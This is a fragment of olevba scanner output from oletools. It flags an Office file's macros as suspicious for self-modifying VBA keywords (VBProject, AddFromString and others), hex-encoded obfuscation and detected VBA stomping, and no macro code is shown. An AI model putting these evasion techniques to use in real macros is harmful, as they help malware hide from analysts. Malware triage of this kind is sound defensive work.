|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

